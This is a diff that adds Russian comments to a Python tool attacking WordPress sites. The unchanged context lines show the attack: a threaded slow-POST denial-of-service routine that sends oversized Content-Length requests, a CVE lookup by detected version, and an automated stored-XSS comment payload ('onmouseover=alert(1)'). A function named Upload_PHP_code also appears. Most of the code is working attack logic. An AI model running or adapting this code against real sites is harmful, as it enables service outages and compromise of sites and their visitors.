@@ -13,6 +13,7 @@ import socket
 import threading
 
 def openConnections(url, threads, sleepTime) :
+    #Парсим урл
     urlParts = urllib.parse.urlparse(url)
     if (urlParts.scheme != 'http'):
         raise Exception('Only the http protocol is currently supported')
@@ -22,10 +23,11 @@ def openConnections(url, threads, sleepTime) :
     if port == None: port = 80
 
     print ("Opening %d sockets to %s:%d" % (threads, urlParts.hostname, port))
-
+    #инициализируем пулл с будущими рабочими
     pool = []
     try:
         for i in range(1, threads):
+            #создаём рабочего, добавляем его в пулл и заставляем работать
             t = Worker(urlParts.hostname, port, urlParts.path, sleepTime)
             pool.append(t)
             t.start()
@@ -33,12 +35,15 @@ def openConnections(url, threads, sleepTime) :
         print ("Started %d threads. Hit ctrl-c to exit" % (threads))
         
         try:
+            #пытаемся обратиться к сайту.
+            #Если в течении 10 секунд открыть сайт не удалось, значит он упал
             req = urllib.request.Request(url)
             htmltext = urlopen(req, timeout=10)
         except socket.timeout as e:
             print("Server is allowing to DOS")
+            #останавливаем отправку пакетов и приостанавливаем поток
             for worker in pool: worker.stop()
-
+            
             for worker in pool: worker.join()         
 
     except KeyboardInterrupt as e:
@@ -63,6 +68,7 @@ class Worker (threading.Thread):
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         s.connect((self.host, self.port))
         s.settimeout(1)
+        #формируем пакет, который будет передавать
         strin = "POST " + self.path +  "HTTP/1.1\r\n "+ "Host: " + self.host + "\r\n" +"Connection: close\r\n" +"Content-Length: 1000000\r\n" +"\r\n"
         s.send(strin.encode('UTF-8'))
 
@@ -86,8 +92,6 @@ def Check_URL (url):
     return url
 
 def Check_WP_and_search_version (url):
-    
-
     agent = 'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.0.7) Gecko/2009021910 Firefox/3.0.7'
     headers = {}
     headers['User-Agent'] = agent
@@ -143,13 +147,16 @@ def Check_WP_and_search_version (url):
         sys.exit()
 
 def Search_vulnerabilities (version):
+        #открываем Firefox
         try:
             driver = webdriver.Firefox()
+        #если Firefox-а нет, то предупреждаем о его небходимости
         except BaseException:
             print("Browser Firefox not found. Please install it before using this app")
             sys.exit()
         driver.get("http://www.cvedetails.com/version-search.php")
         try:       
+            #заполняем поля информацией
             elem= driver.find_element_by_xpath("//input[@name='product']") 
             elem.send_keys("Wordpress")
             elem=driver.find_element_by_xpath("//input[@name='version']")
@@ -203,6 +210,7 @@ def Search_vulnerabilities (version):
 def Type_Expl():
     Typed = False
     try:
+        #Ищем уже написанный эксплоит
         elem = driver.find_element_by_link_text("Exploited!")
         elem.click()
         WebDriverWait(driver, 3).until(EC.alert_is_present())
@@ -211,14 +219,17 @@ def Type_Expl():
         return(True)
     except (TimeoutException, NoSuchElementException):
         try:
+            #заполняем поля для комментария
             author = driver.find_element_by_name("author")
             author.send_keys("Nagibator")
             email = driver.find_element_by_name("email")
             email.send_keys("Nagibator@gmail.com")
             commentbox = driver.find_element_by_id("comment")
+            #сам код эксплоита
             commentbox.send_keys("[a <a href=']'></a><a href=' onmouseover=alert(1) '>Exploited!</a>")
             commentbox.submit()
             Typed = True
+            #опять ищем написанный эксплоит
             elem = driver.find_element_by_link_text("Exploited!")
             elem.click()
             WebDriverWait(driver, 3).until(EC.alert_is_present())
@@ -274,6 +285,7 @@ def Upload_PHP_code(url):
     finally:
         driver.quit()      
         
+#начало программы        
 url=input("Enter URL(e.g. 127.0.0.1/wordpress or example.com):\n")
 url=Check_URL(url)
 version=Check_WP_and_search_version(url)
@@ -281,7 +293,7 @@ Search_vulnerabilities(version)
 version=version.split(".")
 if(len(version)<3):
     version.append(0)
-    
+#преобразование номера версии в числовой тип   
 version=int(version[0])+int(version[1])/10+int(version[2])/100
 if (version <= 2.83):
     y="y"
@@ -325,6 +337,7 @@ if((version >3)and(version<4)):
     driver.get(url)
     list_links = driver.find_elements_by_tag_name("a")
     list = []
+    #сбор всех ссылок на сайте, кроме http://wordpress.org и http://ru.wordpress.org
     for item in list_links:
         if (item.get_attribute('href') not in list and item.get_attribute('href') != "http://wordpress.org/" and item.get_attribute('href') != "http://ru.wordpress.org/"):
             list.append(item.get_attribute('href'))
